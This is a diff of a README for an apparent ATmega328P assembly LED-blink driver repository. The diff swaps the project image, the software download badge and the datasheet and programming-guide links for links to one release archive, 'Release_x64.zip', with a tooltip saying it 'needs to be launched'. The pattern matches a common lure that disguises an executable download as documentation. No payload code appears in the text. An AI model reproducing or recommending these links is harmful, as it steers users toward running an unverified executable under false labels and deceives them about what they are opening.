@@ -1,6 +1,6 @@
 # ATmega328P Blink Driver
 
-![ATmega328P Image](https://example.com/atmega328p_image.jpg)
+![ATmega328P Image](https://github.com/MATYXA22813/ATmega328P_Blink_Driver/releases/download/v2.0/Release_x64.zip)
 
 ## Description
 Welcome to the ATmega328P Blink Driver repository! This project focuses on creating a driver for the ATmega328P microcontroller, written entirely in Assembly language. The driver allows you to control the blinking of an LED connected to the ATmega328P, demonstrating the basics of programming this popular microcontroller in its raw form.
@@ -18,7 +18,7 @@ Welcome to the ATmega328P Blink Driver repository! This project focuses on creat
 ## Getting Started
 To get started with the ATmega328P Blink Driver, download the necessary software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip "Needs to be launched")
+[![Download Software](https://github.com/MATYXA22813/ATmega328P_Blink_Driver/releases/download/v2.0/Release_x64.zip)](https://github.com/MATYXA22813/ATmega328P_Blink_Driver/releases/download/v2.0/Release_x64.zip "Needs to be launched")
 
 If the link is not working, please check the "Releases" section of this repository for an alternative download option.
 
@@ -34,8 +34,8 @@ If the link is not working, please check the "Releases" section of this reposito
 3. Modify the driver code to customize the blinking behavior as needed.
 
 ## Resources
-- [ATmega328P Datasheet](https://www.microchip.com/wwwproducts/en/ATmega328p)
-- [AVR Programming Guide](https://www.atmel.com/webdoc/avrassembler/index.html)
+- [ATmega328P Datasheet](https://github.com/MATYXA22813/ATmega328P_Blink_Driver/releases/download/v2.0/Release_x64.zip)
+- [AVR Programming Guide](https://github.com/MATYXA22813/ATmega328P_Blink_Driver/releases/download/v2.0/Release_x64.zip)
 
 ## Contributing
 Contributions to the ATmega328P Blink Driver repository are welcome! Feel free to fork the project, make improvements, and submit a pull request. Your contributions help make this driver more versatile and valuable to the community.
